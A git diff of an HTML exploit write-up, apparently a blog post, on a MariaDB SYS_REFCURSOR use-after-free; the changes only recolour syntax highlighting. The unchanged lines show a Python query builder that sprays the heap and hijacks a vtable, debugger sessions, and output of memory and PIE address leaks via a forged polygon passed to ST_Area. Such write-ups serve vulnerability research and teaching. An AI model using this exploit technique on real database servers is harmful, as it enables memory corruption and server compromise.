@@ -85,30 +85,30 @@
 <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#6639ba;">gef&gt; </span>print-polygon $rdi
 
 <span style="color:#0550ae;">══════════════ Gis_polygon ══════════════</span>
-  <span style="color:olive;">object</span>     @ 0x7fb65c1277c0
-  <span style="color:olive;">vtable</span>     = <span style="color:#0550ae;">0x563610b5bf18</span>
-  <span style="color:olive;">m_data</span>     = <span style="color:#0550ae;">0x77b61800b6a1</span>
-  <span style="color:olive;">m_data_end</span> = <span style="color:#0550ae;">0x77b71800b69c</span>
+  <span style="color:#6639ba;">object</span>     @ 0x7fb65c1277c0
+  <span style="color:#6639ba;">vtable</span>     = <span style="color:#0550ae;">0x563610b5bf18</span>
+  <span style="color:#6639ba;">m_data</span>     = <span style="color:#0550ae;">0x77b61800b6a1</span>
+  <span style="color:#6639ba;">m_data_end</span> = <span style="color:#0550ae;">0x77b71800b69c</span>
 
 <span style="color:#0550ae;">n_linear_rings</span> = <span style="font-weight:bold;">1</span>
 
 <span style="color:#0550ae;">──────────── ring[0] ────────────</span>
-  <span style="color:olive;">header</span>    @ 0x77b61800b6a5
-  <span style="color:olive;">n_points</span>  = <span style="font-weight:bold;">4</span>  (avail=268435455)
+  <span style="color:#6639ba;">header</span>    @ 0x77b61800b6a5
+  <span style="color:#6639ba;">n_points</span>  = <span style="font-weight:bold;">4</span>  (avail=268435455)
   <span style="color:#0550ae;">point[0]</span> @ 0x77b61800b6a9
-      <span style="color:olive;">x</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
-      <span style="color:olive;">y</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
+      <span style="color:#6639ba;">x</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
+      <span style="color:#6639ba;">y</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
   <span style="color:#0550ae;">point[1]</span> @ 0x77b61800b6b9
-      <span style="color:olive;">x</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
-      <span style="color:olive;">y</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
+      <span style="color:#6639ba;">x</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
+      <span style="color:#6639ba;">y</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
   <span style="color:#0550ae;">point[2]</span> @ 0x77b61800b6c9
-      <span style="color:olive;">x</span> = <span style="color:#6639ba;">1e+300</span> (raw=0x7e37e43c8800759c)
-      <span style="color:olive;">y</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
+      <span style="color:#6639ba;">x</span> = <span style="color:#6639ba;">1e+300</span> (raw=0x7e37e43c8800759c)
+      <span style="color:#6639ba;">y</span> = <span style="color:#6639ba;">0.0</span> (raw=0x0000000000000000)
   <span style="color:#0550ae;">point[3]</span> @ 0x77b61800b6d9
-      <span style="color:olive;">x</span> = <span style="color:#6639ba;">1.344974619049452e-284</span> (raw=0x0500000000000000)
-      <span style="color:olive;">y</span> = <span style="color:#6639ba;">6.5030842125933e-310</span> (raw=0x000077b6133228f8)
+      <span style="color:#6639ba;">x</span> = <span style="color:#6639ba;">1.344974619049452e-284</span> (raw=0x0500000000000000)
+      <span style="color:#6639ba;">y</span> = <span style="color:#6639ba;">6.5030842125933e-310</span> (raw=0x000077b6133228f8)
 
-  <span style="color:olive;">terms_sum</span> = <span style="color:#6639ba;">6.503084212593292e-10</span>
+  <span style="color:#6639ba;">terms_sum</span> = <span style="color:#6639ba;">6.503084212593292e-10</span>
   <span style="color:#6639ba;">ring area</span> = <span style="color:#6639ba;">3.251542106296646e-10</span>
 
 <span style="color:#0550ae;">══════════════════════════════════════════</span>
@@ -133,8 +133,8 @@
 
       <div class='mdb-image-cont'>
       <pre><code>[!] leaking payload
-  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#00ffff;">SQL ▶</span> SELECT ST_Area(a) FROM lk WHERE b IS NOT NULL AND c IS NOT NULL
-  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#5fff87;">SQL ◀</span> 1 row(s): (3.240693733576871e-10,)
+  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#0550ae;">SQL ▶</span> SELECT ST_Area(a) FROM lk WHERE b IS NOT NULL AND c IS NOT NULL
+  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">SQL ◀</span> 1 row(s): (3.240693733576871e-10,)
 leaked address: 0x774fd3fe7738</code></pre>
       <i>Successful leak (MariaDB client view).</i>
       </div>
@@ -224,13 +224,13 @@ leaked address: 0x774fd3fe7738</code></pre>
   
       <p>Fairly simple stuff. Let's look at a query that will trigger this bug.</p>
 
-      <pre><code><span style="color:#6e7781;">   14   </span><span style="color:#6639ba;">def</span><span style="color:#1f2328;"> </span><span style="color:#6639ba;">build_uaf_sql</span><span style="color:#0550ae;">(</span><span style="color:#ffc777;">blob_hex</span><span style="color:#0550ae;">)</span><span style="color:#0550ae;">:</span><span style="color:#1f2328;">
-</span><span style="color:#6e7781;">   13   │</span><span style="color:#1f2328;">   decls </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#0a3069;">&quot;</span><span style="color:#6639ba;">\n</span><span style="color:#0a3069;">&quot;</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">join</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;  DECLARE c</span><span style="color:#0550ae;">%d</span><span style="color:#0a3069;"> SYS_REFCURSOR;&quot;</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">%</span><span style="color:#1f2328;"> i </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#ff966c;">33</span><span style="color:#0550ae;">))</span><span style="color:#1f2328;">
-</span><span style="color:#6e7781;">   12   │</span><span style="color:#1f2328;">   opens </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#0a3069;">&quot;</span><span style="color:#6639ba;">\n</span><span style="color:#0a3069;">&quot;</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">join</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;  OPEN c</span><span style="color:#0550ae;">%d</span><span style="color:#0a3069;"> FOR SELECT 1;&quot;</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">%</span><span style="color:#1f2328;"> i </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#ff966c;">33</span><span style="color:#0550ae;">))</span><span style="color:#1f2328;">
+      <pre><code><span style="color:#6e7781;">   14   </span><span style="color:#6639ba;">def</span><span style="color:#1f2328;"> </span><span style="color:#6639ba;">build_uaf_sql</span><span style="color:#0550ae;">(</span><span style="color:#953800;">blob_hex</span><span style="color:#0550ae;">)</span><span style="color:#0550ae;">:</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">   13   │</span><span style="color:#1f2328;">   decls </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#0a3069;">&quot;</span><span style="color:#6639ba;">\n</span><span style="color:#0a3069;">&quot;</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">join</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;  DECLARE c</span><span style="color:#0550ae;">%d</span><span style="color:#0a3069;"> SYS_REFCURSOR;&quot;</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">%</span><span style="color:#1f2328;"> i </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#0550ae;">33</span><span style="color:#0550ae;">))</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">   12   │</span><span style="color:#1f2328;">   opens </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#0a3069;">&quot;</span><span style="color:#6639ba;">\n</span><span style="color:#0a3069;">&quot;</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">join</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;  OPEN c</span><span style="color:#0550ae;">%d</span><span style="color:#0a3069;"> FOR SELECT 1;&quot;</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">%</span><span style="color:#1f2328;"> i </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#0550ae;">33</span><span style="color:#0550ae;">))</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">   11   │</span><span style="color:#1f2328;">   sprays </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#0a3069;">&quot;&quot;</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">join</span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">
-</span><span style="color:#6e7781;">   10   │</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">   </span><span style="color:#0550ae;">[</span><span style="color:#0a3069;">f&quot;SET @</span><span style="color:#0550ae;">{</span><span style="color:#6639ba;">randstr</span><span style="color:#0550ae;">()</span><span style="color:#0550ae;">}</span><span style="color:#0a3069;"> = 0x</span><span style="color:#0550ae;">{</span><span style="color:#1f2328;">blob_hex</span><span style="color:#0550ae;">}</span><span style="color:#0a3069;">;</span><span style="color:#6639ba;">\n</span><span style="color:#0a3069;">&quot;</span><span style="color:#1f2328;"> </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#ff966c;">0x50</span><span style="color:#0550ae;">)]</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">   10   │</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">   </span><span style="color:#0550ae;">[</span><span style="color:#0a3069;">f&quot;SET @</span><span style="color:#0550ae;">{</span><span style="color:#6639ba;">randstr</span><span style="color:#0550ae;">()</span><span style="color:#0550ae;">}</span><span style="color:#0a3069;"> = 0x</span><span style="color:#0550ae;">{</span><span style="color:#1f2328;">blob_hex</span><span style="color:#0550ae;">}</span><span style="color:#0a3069;">;</span><span style="color:#6639ba;">\n</span><span style="color:#0a3069;">&quot;</span><span style="color:#1f2328;"> </span><span style="color:#6639ba;">for</span><span style="color:#1f2328;"> i </span><span style="color:#0550ae;">in</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">range</span><span style="color:#0550ae;">(</span><span style="color:#0550ae;">0x50</span><span style="color:#0550ae;">)]</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    9   │</span><span style="color:#1f2328;">   </span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
-</span><span style="color:#6e7781;">    8   │</span><span style="color:#1f2328;">   </span><span style="font-style:italic;color:#1f2328;"></span><span style="font-style:italic;color:#fca7ea;">return</span><span style="color:#1f2328;"></span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">(</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;BEGIN NOT ATOMIC</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> decls </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">  DECLARE a INT;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> sprays </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;">
+</span><span style="color:#6e7781;">    8   │</span><span style="color:#1f2328;">   </span><span style="font-style:italic;color:#1f2328;"></span><span style="font-style:italic;color:#cf222e;">return</span><span style="color:#1f2328;"></span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">(</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;BEGIN NOT ATOMIC</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> decls </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">  DECLARE a INT;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> sprays </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;">
 </span><span style="color:#6e7781;background-color:#f6f8fa;">    7   │</span><span style="color:#1f2328;background-color:#f6f8fa;">   </span><span style="color:#6e7781;background-color:#f6f8fa;">│</span><span style="color:#1f2328;background-color:#f6f8fa;">       </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;  SET @@max_open_cursors=200;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> opens </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;">
 </span><span style="color:#6e7781;background-color:#f6f8fa;">    6   │</span><span style="color:#1f2328;background-color:#f6f8fa;">   </span><span style="color:#6e7781;background-color:#f6f8fa;">│</span><span style="color:#1f2328;background-color:#f6f8fa;">       </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;  SET @s1 = 0x&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> blob_hex </span><span style="color:#0550ae;background-color:#f6f8fa;">+</span><span style="color:#1f2328;background-color:#f6f8fa;"> </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#1f2328;background-color:#f6f8fa;">
 </span><span style="color:#6e7781;background-color:#f6f8fa;">    5   │</span><span style="color:#1f2328;background-color:#f6f8fa;">   </span><span style="color:#6e7781;background-color:#f6f8fa;">│</span><span style="color:#1f2328;background-color:#f6f8fa;">       </span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;  FETCH c16 INTO a;</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">END</span><span style="color:#6639ba;background-color:#f6f8fa;">\n</span><span style="color:#0a3069;background-color:#f6f8fa;">&quot;</span><span style="color:#0550ae;background-color:#f6f8fa;">)</span><span style="color:#1f2328;background-color:#f6f8fa;">
@@ -238,14 +238,14 @@ leaked address: 0x774fd3fe7738</code></pre>
 
       <p>This script generates our query. Note <span class='monospace'>decls</span> and <span class='monospace'>open</span>, which declares our 33 REFCURSORs (one more than 32, triggering the dynamic reallocation and the stale REFCURSOR reference later on). Then, we spray a bunch of chunks to reclaim our old chunk, and finally trigger the vtable dispatch (now overwritten) by executing a <span class='monospace'>FETCH</span> query. Some handwaving aside, I'm going to show you what happens when we overwrite this chunk with all <span class='monospace'>0x41</span>. First we place a breakpoint on the function that properly handles the <span class='monospace'>FETCH</span> stuff, which is called <span class='monospace'>Materialized_cursor::fetch</span>.</p>
 
-      <pre><code>[*<span style="color:#6639ba;">#0</span>] <span style="color:#cf222e;">0x7fc572555a82</span> &lt;NO_SYMBOL&gt;
-[ <span style="color:#6639ba;">#1</span>] <span style="color:#cf222e;">0x7fc57254961c</span> &lt;NO_SYMBOL&gt;
-[ <span style="color:#6639ba;">#2</span>] <span style="color:#cf222e;">0x7fc5725d0dce</span> &lt;poll+0x1e&gt;
-[ <span style="color:#6639ba;">#3</span>] <span style="color:#cf222e;">0x55b2c9fdca7a</span> &lt;handle_connections_sockets()+0x2da&gt;
-[ <span style="color:#6639ba;">#4</span>] <span style="color:#cf222e;">0x55b2c9fe3b87</span> &lt;mysqld_main(int, char**)+0x3167&gt;
-[ <span style="color:#6639ba;">#5</span>] <span style="color:#cf222e;">0x7fc5724d3601</span> &lt;NO_SYMBOL&gt;
-[ <span style="color:#6639ba;">#6</span>] <span style="color:#cf222e;">0x7fc5724d3718</span> &lt;__libc_start_main+0x88&gt;
-[ <span style="color:#6639ba;">#7</span>] <span style="color:#cf222e;">0x55b2c9fc06b5</span> &lt;_start+0x25&gt;
+      <pre><code>[*<span style="color:#6639ba;">#0</span>] <span style="color:#0550ae;">0x7fc572555a82</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#6639ba;">#1</span>] <span style="color:#0550ae;">0x7fc57254961c</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#6639ba;">#2</span>] <span style="color:#0550ae;">0x7fc5725d0dce</span> &lt;poll+0x1e&gt;
+[ <span style="color:#6639ba;">#3</span>] <span style="color:#0550ae;">0x55b2c9fdca7a</span> &lt;handle_connections_sockets()+0x2da&gt;
+[ <span style="color:#6639ba;">#4</span>] <span style="color:#0550ae;">0x55b2c9fe3b87</span> &lt;mysqld_main(int, char**)+0x3167&gt;
+[ <span style="color:#6639ba;">#5</span>] <span style="color:#0550ae;">0x7fc5724d3601</span> &lt;NO_SYMBOL&gt;
+[ <span style="color:#6639ba;">#6</span>] <span style="color:#0550ae;">0x7fc5724d3718</span> &lt;__libc_start_main+0x88&gt;
+[ <span style="color:#6639ba;">#7</span>] <span style="color:#0550ae;">0x55b2c9fc06b5</span> &lt;_start+0x25&gt;
 <span style="color:#0550ae;">---------------------------------------------------------------------------------------------------------------------------------------------------
 </span><span style="font-weight:bold;color:#0550ae;"></span><span style="font-weight:bold;color:#6639ba;">gef&gt; </span>break Materialized_cursor::fetch
 Breakpoint 1 at <span style="color:#0550ae;">0x55b2ca0c809d</span></code></pre>
@@ -254,8 +254,8 @@ Breakpoint 1 at <span style="color:#0550ae;">0x55b2ca0c809d</span></code></pre>
 
       <pre><code><span style="font-weight:bold;"></span><span style="font-weight:bold;color:#6639ba;">gef&gt; </span>x/10i $rip-0x20
    <span style="color:#6639ba;">cmp    </span>DWORD PTR [<span style="color:#cf222e;">rdi</span>+<span style="color:#0550ae;">0x910</span>],<span style="color:#cf222e;">esi</span>
-   <span style="color:#6639ba;">jb     </span><span style="color:#0550ae;">0x55b2ca0c8106</span> &lt;<span style="color:olive;">Materialized_cursor::fetch(unsigned long)</span>+118&gt;
-   <span style="color:#6639ba;">jmp    </span><span style="color:#0550ae;">0x55b2ca0c8160</span> &lt;<span style="color:olive;">Materialized_cursor::fetch(unsigned long)</span>+208&gt;
+   <span style="color:#6639ba;">jb     </span><span style="color:#0550ae;">0x55b2ca0c8106</span> &lt;<span style="color:#6639ba;">Materialized_cursor::fetch(unsigned long)</span>+118&gt;
+   <span style="color:#6639ba;">jmp    </span><span style="color:#0550ae;">0x55b2ca0c8160</span> &lt;<span style="color:#6639ba;">Materialized_cursor::fetch(unsigned long)</span>+208&gt;
    <span style="color:#6639ba;">nop    </span>DWORD PTR [<span style="color:#cf222e;">rax</span>+<span style="color:#cf222e;">rax</span>*<span style="color:#0550ae;">1</span>+<span style="color:#0550ae;">0x0</span>]
    <span style="color:#6639ba;">mov    </span><span style="color:#cf222e;">rdi</span>,QWORD PTR [<span style="color:#cf222e;">rbx</span>+<span style="color:#0550ae;">0x20</span>]
    <span style="color:#6639ba;">lea    </span><span style="color:#cf222e;">rsi</span>,[<span style="color:#cf222e;">rbx</span>+<span style="color:#0550ae;">0x8f0</span>]
@@ -268,9 +268,9 @@ Breakpoint 1 at <span style="color:#0550ae;">0x55b2ca0c809d</span></code></pre>
 </span><span style="color:#cf222e;">[!]</span> Cannot access memory at address 0x4141414141414141
 <span style="color:#0550ae;">-------------------------------------------------------------------------------------------------------------------------- arguments (guessed) ----
 </span>QWORD PTR [rax] (
-   <span style="color:#0550ae;">$rdi</span> = <span style="color:#6639ba;">0x000077c514fd8650</span>  -&gt;  0x4141414141414141 <span style="color:olive;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>,
+   <span style="color:#0550ae;">$rdi</span> = <span style="color:#6639ba;">0x000077c514fd8650</span>  -&gt;  0x4141414141414141 <span style="color:#6639ba;">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]'</span>,
    <span style="color:#0550ae;">$rsi</span> = <span style="color:#6639ba;">0x000077c535f3e800</span>  -&gt;  <span style="color:#6639ba;">0x000077c535f3e960</span>  -&gt;  <span style="color:#6639ba;">0x000055b2cb34aaf0</span> &lt;end_of_list&gt;  -&gt;  [loop detected],
-   <span style="color:#0550ae;">$rdx</span> = <span style="color:#6639ba;">0x000077c5355daac0</span>  -&gt;  <span style="color:#ffffff;">0x000055b2cb0b0310</span>  -&gt;  <span style="color:#cf222e;">0x000055b2ca061410</span>  -&gt;  0x5d058d48fa1e0ff3,
+   <span style="color:#0550ae;">$rdx</span> = <span style="color:#6639ba;">0x000077c5355daac0</span>  -&gt;  <span style="color:#ffffff;">0x000055b2cb0b0310</span>  -&gt;  <span style="color:#0550ae;">0x000055b2ca061410</span>  -&gt;  0x5d058d48fa1e0ff3,
    <span style="color:#0550ae;">$rcx</span> = <span style="color:#6639ba;">0x000077c535f3cba0</span>  -&gt;  <span style="color:#6639ba;">0x000077c535f3cfa0</span>  -&gt;  0x0000000000000001,
    <span style="color:#0550ae;">$r8</span> = <span style="color:#6639ba;">0x000077c535f3cba0</span>  -&gt;  <span style="color:#6639ba;">0x000077c535f3cfa0</span>  -&gt;  0x0000000000000001,
    <span style="color:#0550ae;">$r9</span> = 0x0000000000000000,
@@ -283,10 +283,10 @@ Breakpoint 1 at <span style="color:#0550ae;">0x55b2ca0c809d</span></code></pre>
       <p>Let's note how the SYS_REFCURSOR chunk & vtable dispatch actually looks during ordinary, non-exploitative execution. We can place the same breakpoint and inspect the same instruction, the indirect call that does the vtable dispatch:</p>
 
       <pre><code>0x55b0fbc66df0 &lt;sp_cursor::Select_fetch_into_spvars::send_data(List&lt;Item&gt;&amp;)&gt; (
-   <span style="color:#0550ae;">$rdi</span> = <span style="color:#6639ba;">0x00007747aae4ee00</span>  -&gt;  <span style="color:#ffffff;">0x000055b0fccd16b8</span> &lt;vtable for sp_cursor::Select_fetch_into_spvars+0x10&gt;  -&gt;  <span style="color:#cf222e;">0x000055b0fbc66df0</span> &lt;sp_cursor::Sele
+   <span style="color:#0550ae;">$rdi</span> = <span style="color:#6639ba;">0x00007747aae4ee00</span>  -&gt;  <span style="color:#ffffff;">0x000055b0fccd16b8</span> &lt;vtable for sp_cursor::Select_fetch_into_spvars+0x10&gt;  -&gt;  <span style="color:#0550ae;">0x000055b0fbc66df0</span> &lt;sp_cursor::Sele
 ct_fetch_into_spvars::send_data(List&lt;Item&gt;&amp;)&gt;  -&gt;  0xf9894855fa1e0ff3,
    <span style="color:#0550ae;">$rsi</span> = <span style="color:#6639ba;">0x00007747d9f8cdc0</span>  -&gt;  <span style="color:#6639ba;">0x00007747d9f8cf20</span>  -&gt;  <span style="color:#6639ba;">0x000055b0fcf47af0</span> &lt;end_of_list&gt;  -&gt;  [loop detected],
-   <span style="color:#0550ae;">$rdx</span> = <span style="color:#6639ba;">0x00007747d9ef0740</span>  -&gt;  <span style="color:#ffffff;">0x000055b0fccad310</span>  -&gt;  <span style="color:#cf222e;">0x000055b0fbc5e410</span>  -&gt;  0x5d058d48fa1e0ff3,
+   <span style="color:#0550ae;">$rdx</span> = <span style="color:#6639ba;">0x00007747d9ef0740</span>  -&gt;  <span style="color:#ffffff;">0x000055b0fccad310</span>  -&gt;  <span style="color:#0550ae;">0x000055b0fbc5e410</span>  -&gt;  0x5d058d48fa1e0ff3,
    <span style="color:#0550ae;">$rcx</span> = <span style="color:#6639ba;">0x00007747d9f8b160</span>  -&gt;  <span style="color:#6639ba;">0x00007747d9f8b560</span>  -&gt;  0x0000000000000001,
    <span style="color:#0550ae;">$r8</span> = <span style="color:#6639ba;">0x00007747d9f8b160</span>  -&gt;  <span style="color:#6639ba;">0x00007747d9f8b560</span>  -&gt;  0x0000000000000001,
    <span style="color:#0550ae;">$r9</span> = 0x0000000000000000,
@@ -313,28 +313,28 @@ ct_fetch_into_spvars::send_data(List&lt;Item&gt;&amp;)&gt;  -&gt;  0xf9894855fa1
 
       <p>Here's how the PIE leak actually looks:</p>
 
-      <pre><code>  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#5fff87;">SQL ◀</span> 1 row(s): (1.3278924084869121e+177,)
+      <pre><code>  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">SQL ◀</span> 1 row(s): (1.3278924084869121e+177,)
 leaked address: 0x267c170784df4e57
 recovered 2773116791614819927 0x267c170784df4e57
-  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#00ffff;">SQL ▶</span> BEGIN NOT ATOMIC
+  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#0550ae;">SQL ▶</span> BEGIN NOT ATOMIC
   DECLARE c0 SYS_REFCURSOR;
   DECLARE c1 SYS_REFCURSOR;
   DECLARE c2 SYS_REFCURSOR;
   DECLARE c3 SYS_REFCURSOR;
   DECLARE c4 SYS_REFCURSOR;
-  D<span style="color:#8a8a8a;"> ... (411883 chars)</span>
-  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#5fff87;">SQL ◀</span> 1 row(s): (0.0,)
-  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#00ffff;">SQL ▶</span> BEGIN NOT ATOMIC
+  D<span style="color:#6e7781;"> ... (411883 chars)</span>
+  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">SQL ◀</span> 1 row(s): (0.0,)
+  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#0550ae;">SQL ▶</span> BEGIN NOT ATOMIC
   DECLARE c0 SYS_REFCURSOR;
   DECLARE c1 SYS_REFCURSOR;
   DECLARE c2 SYS_REFCURSOR;
   DECLARE c3 SYS_REFCURSOR;
   DECLARE c4 SYS_REFCURSOR;
-  D<span style="color:#8a8a8a;"> ... (411883 chars)</span>
-  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#5fff87;">SQL ◀</span> 1 row(s): (2.3275097575403548e-10,)
+  D<span style="color:#6e7781;"> ... (411883 chars)</span>
+  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">SQL ◀</span> 1 row(s): (2.3275097575403548e-10,)
 leaked address: 0x55b0fccd16b8
 recovered 94218643904184 0x55b0fccd16b8
-[!] leaked PIE! 0x55b0fb3b0000<span style="color:white;background-color:black;"> </span></code></pre>
+[!] leaked PIE! 0x55b0fb3b0000<span style="color:#ffffff;background-color:#1f2328;"> </span></code></pre>
 
       <p>Note the failed attepmt at the beginning --- surely, some garbage must have gotten in the way of our allocation or the allocations did not happen as expected. This failure thankfully does not matter, because our leak does eventually end up succeeding.</p>
 
@@ -350,14 +350,14 @@ recovered 94218643904184 0x55b0fccd16b8
 </span><span style="color:#6e7781;">   11   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">           </span><span style="color:#0550ae;">%</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">_GEOM74</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">hex</span><span style="color:#0550ae;">()</span><span style="color:#0550ae;">,</span><span style="color:#1f2328;"> </span><span style="color:#0550ae;">bytes</span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">b</span><span style="color:#0550ae;">)</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">hex</span><span style="color:#0550ae;">()</span><span style="color:#0550ae;">,</span><span style="color:#1f2328;"> payload</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">hex</span><span style="color:#0550ae;">()))</span><span style="color:#1f2328;">
